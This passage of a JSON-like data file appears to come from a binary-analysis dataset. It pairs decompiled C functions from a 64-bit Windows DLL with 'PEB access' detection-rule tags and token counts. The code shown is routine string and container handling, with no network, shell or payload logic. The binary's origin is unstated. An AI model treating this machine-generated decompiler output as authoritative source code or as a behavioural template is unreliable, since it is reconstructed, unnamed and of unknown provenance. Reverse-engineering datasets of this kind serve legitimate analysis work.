fcn.1800137f0(&uStack344, uVar16);\n            }\n            iStack328 = 0;\n            fcn.18000dc30(&uStack344, var_bp_70h + iVar14);\n            if (uStack320 - iStack328 < 9) {\n                ppiStack360 = 0x9;\n                puVar17 = &uStack344;\n                fcn.180014270(puVar17, 9, 0, 0x1800f46c0);\n            }\n            else {\n                puVar19 = &uStack344;\n                if (0xf < uStack320) {\n                    puVar19 = CONCAT71(Stack343, uStack344);\n                }\n                puVar19 = puVar19 + iStack328;\n                puVar17 = puVar19;\n                iStack328 = iStack328 + 9;\n                fcn.1800ade80(puVar19, 0x1800f46c0, 9);\n                puVar19[9] = 0;\n            }\n            ppiStack360 = &piStack312;\n            uVar5 = fcn.1800056a0(puVar17, ppiStack216, &uStack344, auStack208);\n            *(**ppauStack232 + iStack224 + 4) = uVar5;\n            if (0xf < uStack320) {\n                iVar20 = CONCAT71(Stack343, uStack344);\n                iVar12 = iVar20;\n                if (uStack320 + 1 < 0x1000) {\ncode_r0x000180006ff3:\n                    fcn.18008fb24(iVar12);\n                    goto code_r0x000180006ff8;\n                }\n                iVar12 = *(iVar20 + -8);\n                if ((iVar20 - iVar12) - 8U < 0x20) goto code_r0x000180006ff3;\n                fcn.1800b3528(iVar12, uStack320 + 0x28);\ncode_r0x0001800076f4:\n                fcn.1800b3528();\ncode_r0x0001800076fa:\n                fcn.1800b3528();\ncode_r0x000180007700:\n                fcn.1800b3528();\ncode_r0x000180007706:\n                fcn.1800b3528();\ncode_r0x00018000770c:\n                fcn.1800b3528();\ncode_r0x000180007712:\n                fcn.1800b3528();\n                pcVar3 = swi(3);\n                (*pcVar3)();\n                return;\n            }\ncode_r0x000180006ff8:\n            ppiStack152 = &piStack312;\n            piStack296 = NULL;\n            uStack288 = 0;\n            piVar7 = arg4[2];\n            ppiVar18 = arg4;\n            if (0x7 < arg4[3]) {\n                ppiVar18 = *arg4;\n            }\n            if (piVar7 < 0x8) {\n                piStack312 = *ppiVar18;\n                uStack304 = *(ppiVar18 + 1);\n                uStack300 = *(ppiVar18 + 0xc);\n                uStack288 = 7;\n            }\n            else {\n                uVar16 = piVar7 | 7;\n                if (0x7ffffffffffffffe < uVar16) {\n                    uVar16 = 0x7ffffffffffffffe;\n                }\n                piStack312 = fcn.180011cf0(&piStack312, uVar16 + 1);\n                fcn.1800ade80(piStack312, ppiVar18, piVar7 * 2 + 2);\n                uStack288 = uVar16;\n            }\n            uStack256 = 0;\n            uStack248 = 0xf;\n            uStack272._0_1_ = 0;\n            piStack296 = piVar7;\n            fcn.180011120(&uStack272, 0x1800f46cc, 1);\n            iStack328 = 0;\n            uStack320 = 0xf;\n            uStack344 = 0;\n            uStack280 = 5;\n            uVar16 = *(var_bp_70h + iVar14 + 0x10) + 10;\n            if (0xf < uVar16) {\n                fcn.1800137f0(&uStack344, uVar16);\n            }\n            iStack328 = 0;\n            fcn.18000dc30(&uStack344, var_bp_70h + iVar14);\n            if (uStack320 - iStack328 < 10) {\n                ppiStack360 = 0xa;\n                puVar17 = &uStack344;\n                fcn.180014270(puVar17, 10, 0, 0x1800f46d0);\n            }\n            else {\n                puVar19 = &uStack344;\n                if (0xf < uStack320) {\n                    puVar19 = CONCAT71(Stack343, uStack344);\n                }\n                puVar19 = puVar19 + iStack328;\n                puVar17 = puVar19;\n                iStack328 = iStack328 + 10;\n                fcn.1800ade80(puVar19, 0x1800f46d0, 10);\n                puVar19[10] = 0;\n            }\n            ppiStack352 = &piStack312;\n            ppiStack360 = &uStack272;\n            ppuVar9 = fcn.180004d80(puVar17, &uStack192, ppiStack216, &uStack344);\n            ppuVar1 = ppuVar9 + 2;\n            if (0xf < ppuVar9[3]) {\n                ppuVar9 = *ppuVar9;\n            }\n            if (*ppuVar1 == 0x1) {\n                if (*ppuVar9 == 0x59) {\n                    uVar6 = 0;\n                }\n                else {\n                    uVar6 = -(*ppuVar9 < 0x59) | 1;\n                }\n                if (uVar6 != 0) goto code_r0x0001800071b4;\n                uVar11 = 1;\n            }\n            else {\ncode_r0x0001800071b4:\n                uVar11 = 0;\n            }\n            (**ppauStack232)[iStack224 + 8] = uVar11;\n            if (0xf < uStack168) {\n                iVar20 = CONCAT62(Stack190, CONCAT11(uStack191, uStack192));\n                iVar12 = iVar20;\n                if ((0xfff < uStack168 + 1) && (iVar12 = *(iVar20 + -8),  0x1f < (iVar20 - iVar12) - 8U))\n                goto code_r0x0001800076f4;\n                fcn.18008fb24(iVar12);\n            }\n            uStack176 = 0;\n            uStack168 = 0xf;\n            uStack192 = 0;\n            if (0xf < uStack320) {\n                iVar20 = CONCAT71(Stack343, uStack344);\n                iVar12 = iVar20;\n                if ((0xfff < uStack320 + 1) && (iVar12 = *(iVar20 + -8),  0x1f < (iVar20 - iVar12) - 8U))\n                goto code_r0x0001800076fa;\n                fcn.18008fb24(iVar12);\n            }\n            iStack328 = 0;\n            uStack320 = 0xf;\n            uStack344 = 0;\n            if (0xf < uStack248) {\n                iVar20 = CONCAT71(uStack272._1_7_, uStack272);\n                iVar12 = iVar20;\n                if ((0xfff < uStack248 + 1) && (iVar12 = *(iVar20 + -8),  0x1f < (iVar20 - iVar12) - 8U))\n                goto code_r0x000180007700;\n                fcn.18008fb24(iVar12);\n            }\n            ppiStack152 = &piStack312;\n            piStack296 = NULL;\n            uStack288 = 0;\n            piVar7 = arg4[2];\n            ppiVar18 = arg4;\n            if (0x7 < arg4[3]) {\n                ppiVar18 = *arg4;\n            }\n            if (piVar7 < 0x8) {\n                piStack312 = *ppiVar18;\n                uStack304 = *(ppiVar18 + 1);\n                uStack300 = *(ppiVar18 + 0xc);\n                uStack288 = 7;\n            }\n            else {\n                uVar16 = piVar7 | 7;\n                if (0x7ffffffffffffffe < uVar16) {\n                    uVar16 = 0x7ffffffffffffffe;\n                }\n                piStack312 = fcn.180011cf0(&piStack312, uVar16 + 1);\n                fcn.1800ade80(piStack312, ppiVar18, piVar7 * 2 + 2);\n                uStack288 = uVar16;\n            }\n            uStack256 = 0;\n            uStack248 = 0xf;\n            uStack272._0_1_ = 0;\n            piStack296 = piVar7;\n            fcn.180011120(&uStack272, 0x1800f4652, 0);\n            iStack328 = 0;\n            uStack320 = 0xf;\n            uStack344 = 0;\n            uStack280 = 9;\n            uVar16 = *(var_bp_70h + iVar14 + 0x10) + 0xb;\n            if (0xf < uVar16) {\n                fcn.1800137f0(&uStack344, uVar16);\n            }\n            iStack328 = 0;\n            fcn.18000dc30(&uStack344, var_bp_70h + iVar14);\n            if (uStack320 - iStack328 < 0xb) {\n                ppiStack360 = 0xb;\n                puVar17 = &uStack344;\n                fcn.180014270(puVar17, 0xb, 0, 0x1800f46e0);\n            }\n            else {\n                puVar19 = &uStack344;\n                if (0xf < uStack320) {\n                    puVar19 = CONCAT71(Stack343, uStack344);\n                }\n                puVar19 = puVar19 + iStack328;\n                puVar17 = puVar19;\n                iStack328 = iStack328 + 0xb;\n                fcn.1800ade80(puVar19, 0x1800f46e0, 0xb);\n                puVar19[0xb] = 0;\n            }\n            ppiStack352 = &piStack312;\n            ppiStack360 = &uStack272;\n            uVar10 = fcn.1800050d0(puVar17, &uStack192, ppiStack216, &uStack344);\n            iVar4 = iStack240;\n            fcn.18000d960((*ppauStack232)[iStack240 * 3 + 1], uVar10);\n            if (7 < uStack168) {\n                iVar20 = CONCAT62(Stack190, CONCAT11(uStack191, uStack192));\n                iVar12 = iVar20;\n                if ((0xfff < uStack168 * 2 + 2) && (iVar12 = *(iVar20 + -8),  0x1f < (iVar20 - iVar12) - 8U))\n                goto code_r0x000180007706;\n                fcn.18008fb24(iVar12);\n            }\n            uStack176 = 0;\n            uStack168 = 7;\n            uStack192 = 0;\n            uStack191 = 0;\n            if (0xf < uStack320) {\n                iVar20 = CONCAT71(Stack343, uStack344);\n                iVar12 = iVar20;\n                if ((0xfff < uStack320 + 1) && (iVar12 = *(iVar20 + -8),  0x1f < (iVar20 - iVar12) - 8U))\n                goto code_r0x00018000770c;\n                fcn.18008fb24(iVar12);\n            }\n            iStack328 = 0;\n            uStack320 = 0xf;\n            uStack344 = 0;\n            if (0xf < uStack248) {\n                iVar20 = CONCAT71(uStack272._1_7_, uStack272);\n                iVar12 = iVar20;\n                if ((0xfff < uStack248 + 1) && (iVar12 = *(iVar20 + -8),  0x1f < (iVar20 - iVar12) - 8U))\n                goto code_r0x000180007712;\n                fcn.18008fb24(iVar12);\n            }\n            iStack240 = iVar4 + 1;\n            puStack200 = puStack200 + 1;\n            iStack224 = iStack224 + 0x30;\n            iVar14 = iVar14 + 0x20;\n            arg2 = ppiStack216;\n        } while (puStack200 < puStack160);\n    }\n    if (var_bp_70h != 0) {\n        fcn.180013b30(var_bp_70h, var_bp_68h);\n        iVar14 = var_bp_70h;\n        if ((0xfff < (var_60h - var_bp_70h & 0xffffffffffffffe0U)) &&\n           (iVar14 = *(var_bp_70h + -8),  0x1f < (var_bp_70h - iVar14) - 8U)) {\ncode_r0x00018000771e:\n            fcn.1800b3528();\n            goto code_r0x000180007724;\n        }\n        fcn.18008fb24(iVar14);\n        _var_bp_70h = extraout_XMM0_00 & 0x0;\n        var_60h = 0;\n    }\n    if (0xf < var_40h) {\n        iVar12 = CONCAT71(var_58h._1_7_, var_58h);\n        iVar14 = iVar12;\n        if ((0xfff < var_40h + 1) && (iVar14 = *(iVar12 + -8),  0x1f < (iVar12 - iVar14) - 8U)) {\ncode_r0x000180007724:\n            fcn.1800b3528();\n            pcVar3 = swi(3);\n            (*pcVar3)();\n            return;\n        }\n        fcn.18008fb24(iVar14);\n    }\n    var_48h_2 = CONCAT44(*0x180101914, *0x180101910);\n    var_40h = CONCAT44(*0x18010191c, *0x180101918);\n    var_58h._0_1_ = 0;\n    if (arg2[3] < 0x8) {\ncode_r0x00018000764e:\n        arg2[2] = NULL;\n        arg2[3] = 0x7;\n        *arg2 = 0;\n        if (arg4[3] < 0x8) {\ncode_r0x00018000769c:\n            arg4[2] = NULL;\n            arg4[3] = 0x7;\n            *arg4 = 0;\n            fcn.18008fb00(var_38h ^ auStack392);\n            return;\n        }\n        piVar7 = *arg4;\n        piVar13 = piVar7;\n        if ((arg4[3] * 2 + 2U < 0x1000) || (piVar13 = piVar7[-1],  piVar7 + (-8 - piVar13) < 0x20)) {\n            fcn.18008fb24(piVar13);\n            goto code_r0x00018000769c;\n        }\n    }\n    else {\n        piVar7 = *arg2;\n        iVar14 = arg2[3] * 2;\n        piVar13 = piVar7;\n        if (iVar14 + 2U < 0x1000) {\ncode_r0x000180007649:\n            fcn.18008fb24(piVar13);\n            goto code_r0x00018000764e;\n        }\n        piVar13 = piVar7[-1];\n        if ((piVar7 - piVar13) - 8U < 0x20) goto code_r0x000180007649;\n        fcn.1800b3528(var_48h_2, piVar7 - piVar13, iVar14 + 0x29);\n    }\n    fcn.1800b3528();\ncode_r0x0001800076e2:\n    fcn.1800b3528();\n    pcVar3 = swi(3);\n    (*pcVar3)();\n    return;\n}\n",
        "token_count": 6512
    },
    "180013bc": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid fcn.180013bc0(uint64_t *arg1, uint64_t *arg2)\n\n{\n    uint64_t *puVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    code *pcVar4;\n    uint64_t arg1_00;\n    uint64_t *puVar5;\n    \n    if (arg1 != arg2) {\n        puVar5 = arg1 + 5;\n        do {\n            if (7 < *puVar5) {\n                uVar3 = puVar5[-3];\n                iVar2 = *puVar5 * 2;\n                arg1_00 = uVar3;\n                if (0xfff < iVar2 + 2U) {\n                    arg1_00 = *(uVar3 - 8);\n                    if (0x1f < (uVar3 - arg1_00) - 8) {\n                        fcn.1800b3528(uVar3 - arg1_00, iVar2 + 0x29);\n                        pcVar4 = swi(3);\n                        (*pcVar4)();\n                        return;\n                    }\n                }\n                fcn.18008fb24(arg1_00);\n            }\n            puVar5[-1] = 0;\n            *puVar5 = 7;\n            *(puVar5 + -3) = 0;\n            puVar1 = puVar5 + 1;\n            puVar5 = puVar5 + 6;\n        } while (puVar1 != arg2);\n    }\n    return;\n}\n",
        "token_count": 331
    },
    "180014d7": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid fcn.180014d70(int64_t *arg1, uint64_t arg2)\n\n{\n    uint *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint64_t uVar6;\n    int64_t iVar7;\n    ulong *puVar8;\n    uchar (*arg1_00) [16];\n    uint *arg1_01;\n    int64_t iVar9;\n    uint64_t uVar10;\n    uint *puVar11;\n    ulong *puVar12;\n    uint *puVar13;\n    uint64_t uVar14;\n    ulong var_1h;\n    \n    if (0x555555555555555 < arg2) {\n        fcn.180014900();\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    iVar9 = (arg1[1] - *arg1) / 6 + (arg1[1] - *arg1 >> 0x3f);\n    iVar9 = (iVar9 >> 3) - (iVar9 >> 0x3f);\n    uVar10 = (arg1[2] - *arg1) / 0x30;\n    uVar6 = arg2;\n    if ((uVar10 <= 0x555555555555555 - (uVar10 >> 1)) && (uVar6 = (uVar10 >> 1) + uVar10,  uVar6 < arg2)) {\n        uVar6 = arg2;\n    }\n    puVar11 = NULL;\n    uVar14 = uVar6 * 0x30;\n    uVar10 = 0xffffffffffffffff;\n    if ((uVar6 < 0x555555555555556) && (uVar10 = uVar14,  uVar14 < 0x1000)) {\n        if (uVar14 != 0) {\n            puVar11 = fcn.18008fb2c(uVar14);\n        }\n    }\n    else {\n        uVar14 = uVar10 + 0x27;\n        if (uVar10 + 0x27 <= uVar10) {\n            uVar14 = 0xffffffffffffffff;\n        }\n        iVar7 = fcn.18008fb2c(uVar14);\n        if (iVar7 == 0) goto code_r0x000180014feb;\n        puVar11 = iVar7 + 0x27U & 0xffffffffffffffe0;\n        *(puVar11 + -2) = iVar7;\n    }\n    arg1_00 = puVar11 + iVar9 * 0xc;\n    iVar9 = arg2 - iVar9;\n    if (iVar9 != 0) {\n        puVar8 = arg1_00[2] + 8;\n        do {\n            *arg1_00 = ZEXT816(0);\n            arg1_00[1] = ZEXT816(0);\n            arg1_00[2] = ZEXT816(0);\n            arg1_00 = arg1_00[3];\n            *(puVar8 + -0x24) = 0;\n            *(puVar8 + -4) = 0;\n            puVar8[-1] = 0;\n            *puVar8 = 7;\n            *(puVar8 + -3) = 0;\n            iVar9 = iVar9 + -1;\n            puVar8 = puVar8 + 6;\n        } while (iVar9 != 0);\n    }\n    fcn.180013bc0(arg1_00, arg1_00);\n    puVar1 = arg1[1];\n    puVar13 = *arg1;\n    arg1_01 = puVar11;\n    if (puVar13 != puVar1) {\n        puVar8 = puVar13 + 10;\n        puVar12 = puVar11 + 10;\n        do {\n            *arg1_01 = *puVar13;\n            arg1_01 = arg1_01 + 0xc;\n            *(puVar12 + -0x24) = *(puVar8 + -0x24);\n            puVar13 = puVar13 + 0xc;\n            *(puVar12 + -4) = *(puVar8 + -4);\n            puVar12[-1] = 0;\n            *puVar12 = 0;\n            uVar3 = *(puVar8 + -0x14);\n            uVar4 = *(puVar8 + -2);\n            uVar5 = *(puVar8 + -0xc);\n            *(puVar12 + -3) = *(puVar8 + -3);\n            *(puVar12 + -0x14) = uVar3;\n            *(puVar12 + -2) = uVar4;\n            *(puVar12 + -0xc) = uVar5;\n            uVar3 = *(puVar8 + -4);\n            uVar4 = *puVar8;\n            uVar5 = *(puVar8 + 4);\n            *(puVar12 + -1) = *(puVar8 + -1);\n            *(puVar12 + -4) = uVar3;\n            *puVar12 = uVar4;\n            *(puVar12 + 4) = uVar5;\n            puVar8[-1] = 0;\n            *puVar8 = 7;\n            *(puVar8 + -3) = 0;\n            puVar8 = puVar8 + 6;\n            puVar12 = puVar12 + 6;\n        } while (puVar13 != puVar1);\n    }\n    fcn.180013bc0(arg1_01, arg1_01);\n    if (*arg1 != 0) {\n        fcn.180013bc0(*arg1, arg1[1]);\n        iVar9 = *arg1;\n        iVar7 = iVar9;\n        if ((0xfff < ((arg1[2] - iVar9) / 0x30) * 0x30) && (iVar7 = *(iVar9 + -8),  0x1f < (iVar9 - iVar7) - 8U)) {\ncode_r0x000180014feb:\n            fcn.1800b3528();\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        fcn.18008fb24(iVar7);\n    }\n    *arg1 = puVar11;\n    arg1[1] = puVar11 + arg2 * 0xc;\n    arg1[2] = puVar11 + uVar6 * 0xc;\n    return;\n}\n",
        "token_count": 1445
    },
    "18003e17": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid fcn.18003e170(int64_t arg1, ulong arg2)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int64_t iVar7;\n    int64_t arg3;\n    ulong uVar8;\n    ulong arg3_00;\n    uchar auStack168 [32];\n    uint uStack136;\n    uchar uStack120;\n    unkbyte7 Stack119;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uchar uStack88;\n    unkbyte7 Stack87;\n    ulong uStack72;\n    uint64_t uStack64;\n    ulong uStack56;\n    ulong uStack48;\n    uint64_t uStack32;\n    \n    uStack56 = 0xfffffffffffffffe;\n    uStack32 = *0x180123080 ^ auStack168;\n    uStack48 = arg2;\n    uVar4 = fcn.18004b560(arg1 + 0x30);\n    uStack136 = fcn.18004b560(arg1 + 0x30);\n    iVar5 = (**0x1800de740)(*(arg1 + 0x18), 0x2718);\n    iVar6 = (**0x1800de740)(*(arg1 + 0x18), 0x2719);\n    fcn.180020af0(&uStack48, 0xf, \"%06X %06X \", uVar4);\n    uStack104 = *0x180101910;\n    uStack100 = *0x180101914;\n    uStack96 = *0x180101918;\n    uStack92 = *0x18010191c;\n    uStack120 = 0;\n    iVar7 = -1;\n    do {\n        arg3 = iVar7 + 1;\n        iVar2 = iVar7 + 1;\n        iVar7 = arg3;\n    } while (*(&uStack48 + iVar2) != '\\0');\n    fcn.180011120(&uStack120, &uStack48, arg3);\n    uVar8 = 0x1800f68dc;\n    if (iVar5 == 1) {\n        uVar8 = 0x1800f68c4;\n    }\n    uVar8 = fcn.180020750(&uStack88, &uStack120, uVar8);\n    arg3_00 = 0x1800f67f4;\n    if (iVar6 == 1) {\n        arg3_00 = 0x1800f67c4;\n    }\n    fcn.180020750(arg2, uVar8, arg3_00);\n    if (0xf < uStack64) {\n        iVar2 = CONCAT71(Stack87, uStack88);\n        iVar7 = iVar2;\n        if ((0xfff < uStack64 + 1) && (iVar7 = *(iVar2 + -8),  0x1f < (iVar2 - iVar7) - 8U)) goto code_r0x00018003e33f;\n        fcn.18008fb24(iVar7);\n    }\n    uStack72 = CONCAT44(*0x180101914, *0x180101910);\n    uStack64 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack88 = 0;\n    uVar3 = CONCAT44(uStack92, uStack96);\n    if (0xf < uVar3) {\n        iVar2 = CONCAT71(Stack119, uStack120);\n        iVar7 = iVar2;\n        if (0xfff < uVar3 + 1) {\n            iVar7 = *(iVar2 + -8);\n            if (0x1f < (iVar2 - iVar7) - 8U) {\n                fcn.1800b3528(uStack72, iVar7, uVar3 + 0x28);\ncode_r0x00018003e33f:\n                fcn.1800b3528();\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar7);\n    }\n    fcn.18008fb00(uStack32 ^ auStack168);\n    return;\n}\n",
        "token_count": 953
    },
    "18004f7a": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nulong * fcn.18004f7a0(ulong *arg1, ulong *arg2)\n\n{\n    int64_t *piVar1;\n    int64_t arg2_00;\n    code *pcVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    int64_t iVar6;\n    ulong *puVar7;\n    int64_t arg1_00;\n    uint64_t uVar8;\n    uint64_t uVar9;\n    uint64_t arg2_01;\n    int64_t arg3;\n    \n    if (arg1 != arg2) {\n        puVar7 = arg2;\n        if (7 < arg2[3]) {\n            puVar7 = *arg2;\n        }\n        fcn.180010d70(arg1, puVar7, arg2[2]);\n    }\n    uVar3 = *(arg2 + 0x24);\n    uVar4 = *(arg2 + 5);\n    uVar5 = *(arg2 + 0x2c);\n    piVar1 = arg1 + 6;\n    *(arg1 + 4) = *(arg2 + 4);\n    *(arg1 + 0x24) = uVar3;\n    *(arg1 + 5) = uVar4;\n    *(arg1 + 0x2c) = uVar5;\n    if (piVar1 != arg2 + 6) {\n        arg2_00 = arg2[6];\n        iVar6 = *piVar1;\n        arg3 = arg2[7] - arg2_00;\n        uVar9 = arg3 >> 4;\n        uVar8 = arg1[8] - iVar6 >> 4;\n        if (uVar8 < uVar9) {\n            if (0xfffffffffffffff < uVar9) {\n                fcn.180014900();\n                pcVar2 = swi(3);\n                puVar7 = (*pcVar2)();\n                return puVar7;\n            }\n            arg2_01 = uVar9;\n            if ((uVar8 <= 0xfffffffffffffff - (uVar8 >> 1)) && (arg2_01 = (uVar8 >> 1) + uVar8,  arg2_01 < uVar9)) {\n                arg2_01 = uVar9;\n            }\n            arg1_00 = iVar6;\n            if (iVar6 != 0) {\n                if (0xfff < uVar8 * 0x10) {\n                    arg1_00 = *(iVar6 + -8);\n                    if (0x1f < (iVar6 - arg1_00) - 8U) {\n                        fcn.1800b3528(iVar6 - arg1_00, uVar8 * 0x10 + 0x27);\n                        pcVar2 = swi(3);\n                        puVar7 = (*pcVar2)();\n                        return puVar7;\n                    }\n                }\n                fcn.18008fb24(arg1_00);\n                *piVar1 = 0;\n                arg1[7] = 0;\n                arg1[8] = 0;\n            }\n            iVar6 = fcn.18001b980(arg1_00, arg2_01);\n            *piVar1 = iVar6;\n            arg1[7] = iVar6;\n            arg1[8] = arg2_01 * 0x10 + iVar6;\n        }\n        iVar6 = *piVar1;\n        fcn.1800ade80(iVar6, arg2_00, arg3);\n        arg1[7] = arg3 + iVar6;\n    }\n    return arg1;\n}\n",
        "token_count": 796
    },
    "18006300": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180063000(uint64_t *arg1, ulong *arg2)\n\n{\n    uchar *puVar1;\n    uchar *puVar2;\n    code *pcVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    uint64_t uVar6;\n    uchar *puVar7;\n    uint *arg1_00;\n    uchar auStack104 [32];\n    ulong uStack72;\n    uint64_t *puStack64;\n    uchar auStack56 [16];\n    uint64_t *puStack40;\n    uint64_t uStack32;\n    \n    uStack72 = 0xfffffffffffffffe;\n    uStack32 = *0x180123080 ^ auStack104;\n    uVar5 = 0;\n    *arg1 = 0;\n    arg1[1] = 0;\n    arg1[2] = 0;\n    puVar2 = arg2[1];\n    puVar7 = *arg2;\n    uVar6 = (puVar2 - puVar7) / 0x30;\n    if (uVar6 != 0) {\n        if (0x555555555555555 < uVar6) {\n            fcn.180014900();\n            pcVar3 = swi(3);\n            (*pcVar3)();\n            return;\n        }\n        uVar6 = uVar6 * 0x30;\n        if (uVar6 < 0x1000) {\n            if (uVar6 != 0) {\n                uVar5 = fcn.18008fb2c(uVar6);\n            }\n        }\n        else {\n            uVar5 = uVar6 + 0x27;\n            if (uVar5 <= uVar6) {\n                uVar5 = 0xffffffffffffffff;\n            }\n            iVar4 = fcn.18008fb2c(uVar5);\n            if (iVar4 == 0) {\n                fcn.1800b3528();\n                pcVar3 = swi(3);\n                (*pcVar3)();\n                return;\n            }\n            uVar5 = iVar4 + 0x27U & 0xffffffffffffffe0;\n            *(uVar5 - 8) = iVar4;\n        }\n        *arg1 = uVar5;\n        arg1[1] = uVar5;\n        arg1[2] = uVar6 + uVar5;\n        arg1_00 = *arg1;\n        auStack56 = CONCAT88(arg1_00, arg1_00);\n        puStack64 = arg1;\n        puStack40 = arg1;\n        if (puVar7 != puVar2) {\n            puVar7 = puVar7 + 8;\n            do {\n                *arg1_00 = *(puVar7 + -8);\n                arg1_00[1] = *(puVar7 + -4);\n                *(arg1_00 + 2) = *puVar7;\n                fcn.18000da90(arg1_00 + 4, puVar7 + 8);\n                arg1_00 = arg1_00 + 0xc;\n                auStack56 = CONCAT88(arg1_00, auStack56._0_8_);\n                puVar1 = puVar7 + 0x28;\n                puVar7 = puVar7 + 0x30;\n            } while (puVar1 != puVar2);\n        }\n        fcn.180013bc0(arg1_00, arg1_00);\n        arg1[1] = arg1_00;\n    }\n    fcn.18008fb00(uStack32 ^ auStack104);\n    return;\n}\n",
        "token_count": 796
    },
    "180063bc": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nuint * fcn.180063bc0(int64_t *arg1, ulong *arg2, uint *arg3)\n\n{\n    uint64_t uVar1;\n    uint *puVar2;\n    code *pcVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint64_t uVar7;\n    int64_t iVar8;\n    uint64_t uVar9;\n    uint64_t arg1_00;\n    ulong *puVar10;\n    uint *arg1_01;\n    int64_t iVar11;\n    ulong *puVar12;\n    ulong *puVar13;\n    int64_t iVar14;\n    uint *puVar15;\n    ulong *puVar16;\n    uint *puVar17;\n    \n    iVar8 = *arg1;\n    iVar11 = (arg2 - iVar8) / 6 + (arg2 - iVar8 >> 0x3f);\n    iVar14 = (iVar11 >> 3) - (iVar11 >> 0x3f);\n    iVar11 = (arg1[1] - iVar8) / 0x30;\n    if (iVar11 == 0x555555555555555) {\n        fcn.180014900();\n        pcVar3 = swi(3);\n        puVar15 = (*pcVar3)();\n        return puVar15;\n    }\n    uVar1 = iVar11 + 1;\n    uVar9 = (arg1[2] - iVar8) / 0x30;\n    uVar7 = uVar1;\n    if ((uVar9 <= 0x555555555555555 - (uVar9 >> 1)) && (uVar7 = (uVar9 >> 1) + uVar9,  uVar7 < uVar1)) {\n        uVar7 = uVar1;\n    }\n    uVar9 = uVar7 * 0x30;\n    if (uVar7 < 0x555555555555556) {\n        if (0xfff < uVar9) goto code_r0x000180063cb7;\n        if (uVar9 == 0) {\n            puVar15 = NULL;\n        }\n        else {\n            puVar15 = fcn.18008fb2c(uVar9);\n        }\n    }\n    else {\n        uVar9 = 0xffffffffffffffff;\ncode_r0x000180063cb7:\n        arg1_00 = uVar9 + 0x27;\n        if (arg1_00 <= uVar9) {\n            arg1_00 = 0xffffffffffffffff;\n        }\n        iVar8 = fcn.18008fb2c(arg1_00);\n        if (iVar8 == 0) goto code_r0x000180063f6d;\n        puVar15 = iVar8 + 0x27U & 0xffffffffffffffe0;\n        *(puVar15 + -2) = iVar8;\n    }\n    puVar2 = puVar15 + iVar14 * 0xc;\n    arg1_01 = puVar2 + 0xc;\n    *puVar2 = *arg3;\n    puVar2[1] = arg3[1];\n    *(puVar2 + 2) = *(arg3 + 2);\n    fcn.18000da90(puVar2 + 4, arg3 + 4);\n    puVar10 = arg1[1];\n    puVar13 = *arg1;\n    if (arg2 == puVar10) {\n        arg1_01 = puVar15;\n        if (puVar13 != puVar10) {\n            puVar12 = puVar13 + 5;\n            puVar16 = puVar15 + 10;\n            do {\n                *arg1_01 = *puVar13;\n                *(puVar16 + -0x24) = *(puVar12 + -0x24);\n                *(puVar16 + -4) = *(puVar12 + -4);\n                puVar16[-1] = 0;\n                *puVar16 = 0;\n                uVar4 = *(puVar12 + -0x14);\n                uVar5 = *(puVar12 + -2);\n                uVar6 = *(puVar12 + -0xc);\n                *(puVar16 + -3) = *(puVar12 + -3);\n                *(puVar16 + -0x14) = uVar4;\n                *(puVar16 + -2) = uVar5;\n                *(puVar16 + -0xc) = uVar6;\n                uVar4 = *(puVar12 + -4);\n                uVar5 = *puVar12;\n                uVar6 = *(puVar12 + 4);\n                *(puVar16 + -1) = *(puVar12 + -1);\n                *(puVar16 + -4) = uVar4;\n                *puVar16 = uVar5;\n                *(puVar16 + 4) = uVar6;\n                puVar12[-1] = 0;\n                *puVar12 = 7;\n                *(puVar12 + -3) = 0;\n                arg1_01 = arg1_01 + 0xc;\n                puVar16 = puVar16 + 6;\n                puVar13 = puVar13 + 6;\n                puVar12 = puVar12 + 6;\n            } while (puVar13 != puVar10);\n        }\n    }\n    else {\n        puVar17 = puVar15;\n        if (puVar13 != arg2) {\n            puVar10 = puVar13 + 5;\n            puVar12 = puVar15 + 10;\n            do {\n                *puVar17 = *puVar13;\n                *(puVar12 + -0x24) = *(puVar10 + -0x24);\n                *(puVar12 + -4) = *(puVar10 + -4);\n                puVar12[-1] = 0;\n                *puVar12 = 0;\n                uVar4 = *(puVar10 + -0x14);\n                uVar5 = *(puVar10 + -2);\n                uVar6 = *(puVar10 + -0xc);\n                *(puVar12 + -3) = *(puVar10 + -3);\n                *(puVar12 + -0x14) = uVar4;\n                *(puVar12 + -2) = uVar5;\n                *(puVar12 + -0xc) = uVar6;\n                uVar4 = *(puVar10 + -4);\n                uVar5 = *puVar10;\n                uVar6 = *(puVar10 + 4);\n                *(puVar12 + -1) = *(puVar10 + -1);\n                *(puVar12 + -4) = uVar4;\n                *puVar12 = uVar5;\n                *(puVar12 + 4) = uVar6;\n                puVar10[-1] = 0;\n                *puVar10 = 7;\n                *(puVar10 + -3) = 0;\n                puVar17 = puVar17 + 0xc;\n                puVar12 = puVar12 + 6;\n                puVar13 = puVar13 + 6;\n                puVar10 = puVar10 + 6;\n            } while (puVar13 != arg2);\n        }\n        fcn.180013bc0(puVar17, puVar17);\n        puVar10 = arg1[1];\n        if (arg2 != puVar10) {\n            iVar8 = iVar14 * 0x30 - arg2;\n            puVar13 = arg2 